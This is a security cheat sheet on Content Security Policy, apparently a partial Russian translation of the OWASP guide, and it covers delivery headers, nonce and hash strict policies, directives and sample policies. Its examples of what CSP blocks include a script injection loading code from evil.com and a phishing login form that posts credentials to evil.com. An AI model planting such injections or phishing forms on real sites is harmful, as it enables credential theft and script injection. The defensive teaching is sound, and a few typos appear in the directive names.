# Шпаргалка по Content Security Policy

## Введение

Эта статья представляет способ интеграции концепции **глубокой защиты** на стороне клиента веб-приложений. Путем внедрения заголовков Content-Security-Policy (CSP) с сервера браузер становится осведомленным и способен защищать пользователя от динамических вызовов, загружающих содержимое на страницу, которая в данный момент посещается.

## Контекст

Рост числа уязвимостей XSS (межсайтового скриптинга), кликджекинга и утечек данных между сайтами требует более подхода безопасности с концепцией **глубокой защиты**.

### Защита от XSS

CSP защищает от XSS-атак следующими способами:

#### 1. Ограничение встроенных скриптов

Запрещая странице выполнять встроенные скрипты, такие атаки, как инъекции

```html
<script>document.body.innerHTML='defaced'</script>
```

 не сработают.

#### 2. Ограничение удаленных скриптов

Запрещая странице загружать скрипты с произвольных серверов, такие атаки, как внедрение

```html
<script src="https://evil.com/hacked.js"></script>
```

не сработают.

#### 3. Ограничение небезопасного JavaScript

Запрещая странице выполнять функции преобразования текста в JavaScript, такие как `eval`, сайт будет защищен от подобных уязвимостей:

```js
// Простой калькулятор
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`Сумма: ${sum}`);
```

#### 4. Ограничение отправки форм

Ограничивая, куда могут отправлять данные HTML-формы на вашем сайте, внедрение фишинговых форм также не сработает.

```html
<form method="POST" action="https://evil.com/collect">
<h3>Сессия истекла! Пожалуйста, войдите снова.</h3>
<label>Имя пользователя</label>
<input type="text" name="username"/>

<label>Пароль</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

#### 5. Ограничение объектов

Кроме того, запрет тега HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) предотвратит возможность внедрения злоумышленниками вредоносных программ на Flash, Java или других устаревших исполняемых файлов на страницу.

### Защита от атак на фреймы

Атаки, такие как кликджекинг и некоторые варианты атак стороннего канала браузера (xs-leaks), требуют, чтобы вредоносный веб-сайт загрузил целевой сайт во фрейме.

Исторически заголовок `X-Frame-Options` использовался для этого, но он был заменен директивой CSP `frame-ancestors`.

### Защита в глубину

Сильная CSP обеспечивает эффективный **второй уровень** защиты от различных видов уязвимостей, особенно XSS. Хотя CSP не предотвращает наличие уязвимостей в веб-приложениях, она может значительно усложнить их эксплуатацию для злоумышленника.

Даже на полностью статическом веб-сайте, который не принимает никаких пользовательских данных, CSP может использоваться для обеспечения использования [интеграции подресурсов (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). Это может помочь предотвратить загрузку вредоносного кода на сайт, если один из сторонних сайтов, размещающих файлы JavaScript (например, скрипты аналитики), будет скомпрометирован.

При всем при этом CSP **не должна** быть единственным механизмом защиты от XSS. Вы должны по-прежнему соблюдать хорошие практики разработки, такие как описанные в [шпаргалке по предотвращению XSS](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), а затем внедрять CSP в качестве дополнительного уровня защиты.

## Доставка политики

Вы можете доставить Content Security Policy на ваш веб-сайт тремя способами.

### 1. Заголовок Content-Security-Policy

Отправьте HTTP-заголовок ответа Content-Security-Policy с вашего веб-сервера.

```text
Content-Security-Policy: ...
```

Использование заголовка является предпочтительным способом и поддерживает весь набор функций CSP. Отправляйте его во всех HTTP-ответах, а не только на главной странице.

Это стандартный заголовок спецификации W3C, поддерживаемый Firefox 23+, Chrome 25+ и Opera 19+.

### 2. Заголовок Content-Security-Policy-Report-Only

С использованием `Content-Security-Policy-Report-Only`, вы можете доставить CSP, которая не будет применяться.

```text
Content-Security-Policy-Report-Only: ...
```

Тем не менее, отчеты о нарушениях будут выводиться в консоль и отправляться на конечную точку отчета, если используются директивы `report-to` и `report-uri`.

Это также стандартный заголовок спецификации W3C. Поддерживается Firefox 23+, Chrome 25+ и Opera 19+, где политика является не блокирующей ("открытый отказ") и отчет отправляется на URL, указанный в директиве `report-uri` (или новой `report-to`). Часто используется как предшественник к использованию CSP в режиме блокировки ("закрытый отказ").

Браузеры полностью поддерживают возможность использования сайтом как `Content-Security-Policy`, так и `Content-Security-Policy-Report-Only` вместе, без каких-либо проблем. Этот шаблон можно использовать, например, для запуска строгой политики `Report-Only` (для получения множества отчетов о нарушениях), в то время как применяется более слабая политика (чтобы избежать нарушения функциональности сайта).

### 3. Мета-тег Content-Security-Policy

Иногда вы не можете использовать заголовок Content-Security-Policy, если, например, вы размещаете ваши HTML-файлы в CDN, где заголовки находятся вне вашего контроля.

В этом случае вы все равно можете использовать CSP, указав мета-тег `http-equiv` в разметке HTML, следующим образом:

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

Поддерживаются практически все функции, включая полную защиту от XSS. Однако вы не сможете использовать [защиту фреймов](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [песочницу](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), или [конечную точку логирования нарушений CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).

### ПРЕДУПРЕЖДЕНИЕ

**НЕ** используйте `X-Content-Security-Policy` или `X-WebKit-CSP`. Их реализации устарели (с Firefox 23, Chrome 25), ограничены, непоследовательны и чрезвычайно забагованные.

## Типы CSP (гранулярные/разрешающие или строгие)

Изначально механизм создания CSP предполагал создание списков разрешений, которые определяли бы содержимое и источники, разрешенные в контексте HTML-страницы.

Однако текущая передовая практика состоит в создании "Строгой" CSP, которая намного проще в развертывании и безопаснее, так как ее сложнее обойти.

## Строгая CSP

Строгая CSP может быть создана с использованием ограниченного числа гранулярных [директив Fetch, перечисленных ниже](#fetch-directives), наряду с одним из двух механизмов:

- На основе одноразовых ключей (Nonce)
- На основе хешей

Директива `strict-dynamic` также может использоваться для упрощения внедрения строгой CSP.

В следующих разделах будут представлены некоторые основные рекомендации по этим механизмам, но настоятельно рекомендуется следовать подробным и методологическим инструкциям Google по созданию строгой CSP:

**[Смягчение межсайтового скриптинга (XSS) с помощью строгой политики безопасности контента (CSP)](https://web.dev/strict-csp/)**

### Основанные на одноразовых ключах (Nonce)

Nonce — это уникальные одноразовые случайные значения, которые вы генерируете для каждого HTTP-ответа и добавляете в заголовок Content-Security-Policy следующим образом:

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

Затем вы передаете этот одноразовый ключ в представление (использование одноразовых ключей требует не статичного HTML) и рендерите теги скриптов, которые выглядят примерно так:

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

#### Предупреждение

**Не** создавайте middleware, который заменяет все теги скриптов на "script nonce=...", потому что в этом случае злоумышленники также получат одноразовые ключи. Вам необходим настоящий механизм шаблонизации HTML для использования одноразовых ключей.

### Хеши

Когда требуется использование встроенных скриптов, `script-src 'hash_algo-hash'` является еще одним вариантом, позволяющим выполнить только определенные скрипты.

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

Чтобы получить хеш, посмотрите в инструментах разработчика Google Chrome нарушения, такие как это:

> ❌ Выполнение встроенного скрипта было отказано, так как это нарушает следующую директиву Content Security Policy: "..." Используйте либо ключевое слово 'unsafe-inline', либо хеш (**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**), либо одноразовый ключ (nonce)...

Вы также можете использовать этот [генератор хешей](https://report-uri.com/home/hash). Это отличный [пример](https://csp.withgoogle.com/docs/faq.html#static-content) использования хешей.

#### Примечание

Использование хешей может быть рискованным. Если вы измените что-либо внутри тега скрипта (даже пробелы), например, отформатируете код, хеш будет другим, и скрипт не выполнится.

### strict-dynamic

Директива `strict-dynamic` может использоваться как часть строгой CSP в сочетании с хешами или одноразовыми ключами (nonce).

Если блок скрипта, который содержит либо правильный хеш, либо одноразовый ключ, создает дополнительные элементы DOM и выполняет JS внутри них, `strict-dynamic` указывает браузеру доверять этим элементам, не требуя явного добавления одноразовых ключей или хешей для каждого из них.

Обратите внимание, что `strict-dynamic` является функцией CSP уровня 3, CSP уровня 3 поддерживается большинством современных браузеров.

Для получения дополнительной информации ознакомьтесь с [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).

## Подробные директивы CSP

Существуют различные типы директив, позволяющих разработчику контролировать политику на уровне гранул. Имейте в виду, что создание нестрогой политики, которая слишком гранулирована или разрешает слишком много, может привести к обходу политики и потере защиты.

### Директивы выборки (Fetch)

Директивы Fetch указывают браузеру, каким местам доверять и откуда загружать ресурсы.

Большинство директив fetch имеют определенный [резервный список, определённый в W3](https://www.w3.org/TR/CSP3/#directive-fallback-list). Этот список позволяет детально контролировать источник скриптов, изображений, файлов и т. д.

- `child-src` позволяет разработчику управлять вложенными контекстами просмотра и рабочими контекстами выполнения.
- `connect-src` обеспечивает контроль над fetch-запросами, XHR, eventsource, beacon и websockets-соединениями.
- `font-src` указывает, с каких URL загружать шрифты.
- `img-src` определяет URL, с которых можно загружать изображения.
- `manifest-src` определяет URL, с которых можно загружать манифесты приложений.
- `media-src` определяет URL-адреса, с которых могут загружаться видео-, аудио- и текстовые дорожки.
- `prefetch-src` определяет URL-адреса, с которых можно осуществлять предварительную выборку ресурсов.
- `object-src` определяет URL-адреса, с которых можно загружать плагины.
- `cript-src` указывает местоположение, с которого может быть выполнен скрипт. Является запасной директивой для других скрипт-подобных директив.
    - `script-src-elem` управляет местом, откуда будут выполняться запросы и блоки скриптов.
    - `style-src-attr` управляет аттрибутами стилей.
- `default-src` - резервная директива для других Fetch директив.
 Определённые директивы не имеют наследования, в то время как неопределённые директивы будут определены как `default-src`.

### Директивы документа

Директивы документа используются для указания браузеру свойств документа, к которым будут применяться политики.

- `base-uri` определяет возможные URL-адреса, которые могут использоваться элементом `<base>`.
- `plugin-types` ограничивает типы ресурсов, которые могут загружаться в документе (*например*, application/pdf). 3 правила применяются к подверженным элементам, `<embed>` и `<object>`:
    - Элемент должен явно объявить свой тип.
    - Тип элемента должен соответствовать объявленному типу.
    - Ресурс элемента должен соответствовать объявленному типу.
- `sandbox` ограничивает действия на странице, такие как отправка форм.
    - Применяется только при использовании с заголовком запроса `Content-Security-Policy`.
    - Если не указывать значение директивы, то активируются все ограничения песочницы. `Content-Security-Policy: sandbox;`
    - [Синтаксис песочницы](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

### Navigation Directives

Navigation directives instruct the browser about the locations that the document can navigate to or be embedded from.

- `form-action` restricts the URLs which the forms can submit to.
- `frame-ancestors` restricts the URLs that can embed the requested resource inside of  `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
    - If this directive is specified in a `<meta>` tag, the directive is ignored.
    - This directive doesn't fallback to the `default-src` directive.
    - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.

### Reporting Directives

Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.

- `report-to` which is a group name defined in the header in a JSON formatted header value.
    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` directive is deprecated by `report-to`, which is a URI that the reports are sent to.
    - Goes by the format of: `Content-Security-Policy: report-uri https://example.com/csp-reports`

In order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports `report-to`, it will ignore `report-uri`. Otherwise, `report-uri` will be used.

### Special Directive Sources

| Value            | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| 'none'           | No URLs match.                                                              |
| 'self'           | Refers to the origin site with the same scheme and port number.             |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |

To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).

## CSP Sample Policies

### Strict Policy

A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.

As noted above, Google went ahead and set up a detailed and methodological [instructions](https://web.dev/strict-csp) for creating a Strict CSP.

Based on those instructions, one of the following two policies can be used to apply a strict policy:

#### Nonce-based Strict Policy

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

#### Hash-based Strict Policy

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

### Basic non-Strict CSP Policy

This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.

If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.

The most basic policy assumes:

- All resources are hosted by the same domain of the document.
- There are no inlines or evals for scripts and style resources.
- There is no need for other websites to frame the website.
- There are no form-submissions to external websites.

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

To tighten further, one can apply the following:

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).

### Upgrading insecure requests

If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### Preventing framing attacks (clickjacking, cross-site leaks)

- To prevent all framing of your content use:
    - `Content-Security-Policy: frame-ancestors 'none';`
- To allow for the site itself, use:
    - `Content-Security-Policy: frame-ancestors 'self';`
- To allow for trusted domain, do the following:
    - `Content-Security-Policy: frame-ancestors trusted.com;`

### Refactoring inline code

When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:

```javascript
<script>
var foo = "314"
<script>
```

The inline code can be moved to a separate JavaScript file and the code in the page becomes:

```javascript
<script src="app.js">
</script>
```

With `app.js` containing the `var foo = "314"` code.

The inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:

```html
<button id="button1" onclick="doSomething()">
```

This should be replaced by `addEventListener` calls:

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

## References

- [Strict CSP](https://web.dev/strict-csp)
- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
- [Content-Security-Policy](https://content-security-policy.com/)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
- CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
- [CSP evaluator](https://csp-evaluator.withgoogle.com/)
